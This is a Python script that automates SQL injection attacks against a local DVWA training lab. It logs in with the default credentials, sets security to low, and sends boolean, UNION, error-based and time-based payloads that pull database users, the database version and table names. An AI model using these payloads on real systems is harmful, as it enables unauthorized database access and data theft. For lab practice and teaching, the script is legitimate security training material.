import requests
import time
import sys
import re
from requests.exceptions import ConnectionError

class DVVASQLInjector:
    def __init__(self, base_url, username, password):
        # Normalize base URL (strip trailing slash)
        self.base_url = base_url.rstrip('/')
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        # Keep credentials if needed later
        self.username = username
        self.password = password

    def _get_csrf_token(self, path: str, field: str = 'user_token'):
        """Fetch a page and extract DVWA CSRF token from hidden field."""
        try:
            r = self.session.get(f"{self.base_url}/{path}", timeout=10, allow_redirects=True)
            # Pattern like: <input type='hidden' name='user_token' value='...'>
            m = re.search(rf"name=['\"]{re.escape(field)}['\"]\s+value=['\"]([^'\"]+)", r.text)
            return m.group(1) if m else None
        except Exception:
            return None
        
    def check_connectivity(self):
        """Check if we can connect to the target URL"""
        print(f"[*] Testing connection to: {self.base_url}")
        try:
            response = self.session.get(self.base_url, timeout=10, allow_redirects=True)
            if 200 <= response.status_code < 400:
                print("[+] Successfully connected to DVWA")
                return True
            else:
                print(f"[-] HTTP Status {response.status_code}")
                return False
        except ConnectionError:
            print("[-] Connection failed! Please check:")
            print("    1. Is XAMPP/WAMP running? (Start Apache)")
            print("    2. Is DVWA in the correct folder?")
            print(f"    3. Try opening {self.base_url} in your browser")
            return False

    def login(self, username, password):
        """Login to DVWA"""
        print("[*] Logging into DVWA...")
        
        login_data = {
            'username': username,
            'password': password,
            'Login': 'Login'
        }
        
        try:
            # Get login page first to handle any CSRF tokens
            token = self._get_csrf_token('login.php', 'user_token')
            if token:
                login_data['user_token'] = token
            
            # Perform login
            response = self.session.post(
                f"{self.base_url}/login.php", 
                data=login_data,
                allow_redirects=True,
                timeout=10
            )
            
            # Check if login was successful
            # DVWA typically redirects to index.php and shows a logout link when logged in
            if ('logout' in response.text.lower()) or ('index.php' in response.url.lower()):
                print("[+] Login successful!")
                return True
            elif 'Login failed' in response.text:
                print("[-] Login failed - wrong credentials")
                return False
            else:
                print("[-] Could not determine login status")
                return False
                
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False

    def set_security_level(self, level='low'):
        """Set DVWA security level"""
        print(f"[*] Setting security level to '{level}'...")
        
        security_data = {
            'security': level,
            'seclev_submit': 'Submit'
        }
        
        try:
            # Get token first
            token = self._get_csrf_token('security.php', 'user_token')
            if token:
                security_data['user_token'] = token
            # Post with token
            response = self.session.post(f"{self.base_url}/security.php", data=security_data, timeout=10, allow_redirects=True)
            if response.status_code == 200:
                print(f"[+] Security level set to {level}")
                return True
            else:
                print("[-] Failed to set security level")
                return False
        except Exception as e:
            print(f"[-] Error setting security: {e}")
            return False

    def test_sql_injection(self):
        """Test basic SQL injection"""
        print("\n" + "="*50)
        print("[*] STARTING SQL INJECTION TESTS")
        print("="*50)
        
        # Test payloads from simple to complex
        payloads = [
            {
                'payload': "1",
                'description': "Normal query - should return admin user",
                'expected': "admin"
            },
            {
                'payload': "1' OR '1'='1",
                'description': "Basic SQL Injection - should return all users",
                'expected': "admin"
            },
            {
                'payload': "1' OR 1=1 -- ",
                'description': "Comment-based injection",
                'expected': "admin"
            },
            {
                'payload': "1' UNION SELECT user(), database() -- ",
                'description': "Extract database information",
                'expected': "user()"
            },
            {
                'payload': "1' UNION SELECT table_name, table_schema FROM information_schema.tables -- ",
                'description': "Extract all table names",
                'expected': "users"
            }
        ]
        
        for test in payloads:
            print(f"\n[*] Test: {test['description']}")
            print(f"    Payload: {test['payload']}")
            
            try:
                params = {'id': test['payload'], 'Submit': 'Submit'}
                # Use GET for DVWA SQLi
                response = self.session.get(f"{self.base_url}/vulnerabilities/sqli/", params=params, timeout=10)
                
                # Check if injection worked
                if self._has_name_block(response.text):
                    print(f"    [+] SUCCESS: Found name block in response")
                    self.extract_data_from_response(response)
                else:
                    # Fallback heuristic: look for common DVWA markers
                    if 'id=' in response.url and '<pre>' in response.text:
                        print("    [~] Potential data block present, review output")
                        self.extract_data_from_response(response)
                    else:
                        print("    [-] No expected data found in response")
                    
                time.sleep(1)  # Be nice to the server
                
            except Exception as e:
                print(f"    [-] Error: {e}")

    def extract_data_from_response(self, response):
        """Extract and display meaningful data from response"""
        # Look for the specific pattern in DVWA responses
        if self._has_name_block(response.text):
            # Extract the relevant part
            start = response.text.find("First name:")
            end = response.text.find("</pre>", start)
            if start != -1 and end != -1:
                data_section = response.text[start:end]
                lines = [line.strip() for line in data_section.split('\n') if line.strip()]
                for line in lines[:6]:  # Show first 6 lines
                    print(f"      {line}")

    def _has_name_block(self, text: str) -> bool:
        return ("First name:" in text) and ("Surname:" in text)

    def comprehensive_test(self):
        """Run a comprehensive SQL injection test"""
        print("\n" + "="*50)
        print("[*] COMPREHENSIVE SQL INJECTION TEST")
        print("="*50)
        
        # Test different injection techniques
        techniques = [
            ("Boolean-based", ["1' AND '1'='1", "1' AND '1'='2"]),
            ("Union-based", ["1' UNION SELECT 1,2 -- ", "1' UNION SELECT @@version, user() -- "]),
            ("Error-based", ["1' AND ExtractValue(1,CONCAT(0x3a,user())) -- "]),
            ("Time-based", ["1' AND SLEEP(5) -- "]),
        ]
        
        for technique_name, technique_payloads in techniques:
            print(f"\n[*] Testing {technique_name} Injection:")
            for payload in technique_payloads:
                print(f"    Trying: {payload}")
                try:
                    params = {'id': payload, 'Submit': 'Submit'}
                    start_time = time.time()
                    response = self.session.get(f"{self.base_url}/vulnerabilities/sqli/", params=params, timeout=10)
                    response_time = time.time() - start_time
                    
                    if self._has_name_block(response.text):
                        print("      [+] Potential success - person records shown")
                    elif response_time > 4:  # If sleep worked
                        print("      [+] Time-based injection possible")
                    else:
                        print("      [-] No obvious success")
                        
                except Exception as e:
                    print(f"      [-] Error: {e}")

def setup_dvwa_instructions():
    """Print setup instructions"""
    print("DVWA SETUP INSTRUCTIONS")
    print("=" * 40)
    print("""
1. START WEB SERVER:
   - Open XAMPP Control Panel
   - Start Apache and MySQL

2. SETUP DVWA:
   - Copy DVWA files to: C:\\xampp\\htdocs\\dvwa\\
   - Open browser to: http://localhost/dvwa/setup.php
   - Click 'Create / Reset Database'
   - Login with admin/password

3. CONFIGURE SECURITY:
   - Go to 'DVWA Security' tab
   - Set security level to 'Low'
   - Click 'Submit'

4. TEST IN BROWSER:
   - Go to 'SQL Injection' tab
   - Try entering: 1' OR '1'='1
   - You should see multiple users
    """)

def test_dvwa_urls():
    """Test common DVWA URLs to find the correct one"""
    test_urls = [
        "http://localhost/dvwa",
        "http://localhost/dvwa-master",
        "http://localhost:80/dvwa",
        "http://127.0.0.1/dvwa",
        "http://localhost"  # If directly in htdocs
    ]
    
    print("[*] Scanning for DVWA installation...")
    session = requests.Session()
    
    for url in test_urls:
        try:
            response = session.get(url, timeout=5)
            if response.status_code == 200 and ('DVWA' in response.text or 'login' in response.text):
                print(f"[+] FOUND DVWA at: {url}")
                return url
        except:
            continue
    
    print("[-] Could not auto-detect DVWA URL")
    return None

def main():
    """Main execution function"""
    
    print("DVWA SQL Injection Tester")
    print("=" * 30)
    print("Based on your path: C:\\Soft\\digininja-DVWA-a96943d\\")
    print("=" * 30)
    
    # First, try to detect DVWA URL
    detected_url = test_dvwa_urls()
    
    if detected_url:
        DVWA_URL = detected_url
        print(f"\n[*] Using detected URL: {DVWA_URL}")
    else:
        # Manual configuration
        DVWA_URL = "http://localhost/dvwa"  # Change this if different
        print(f"\n[*] Using default URL: {DVWA_URL}")
        print("[*] If this doesn't work, please update the URL in the script")
    
    USERNAME = "admin"
    PASSWORD = "password"
    
    # Initialize tester
    tester = DVVASQLInjector(DVWA_URL, USERNAME, PASSWORD)
    
    # Step 1: Check connection
    if not tester.check_connectivity():
        print("\n" + "="*40)
        setup_dvwa_instructions()
        return
    
    # Step 2: Login
    if not tester.login(USERNAME, PASSWORD):
        print("\n[!] Login failed. Please complete DVWA setup in your browser first.")
        print(f"    Go to: {DVWA_URL}/setup.php")
        return
    
    # Step 3: Set security level
    tester.set_security_level('low')
    
    # Step 4: Run tests
    tester.test_sql_injection()
    
    # Step 5: Comprehensive test
    tester.comprehensive_test()
    
    print("\n" + "="*50)
    print("[*] TESTING COMPLETE")
    print("[*] Check the results above for SQL Injection vulnerabilities")
    print("="*50)

if __name__ == "__main__":
    main()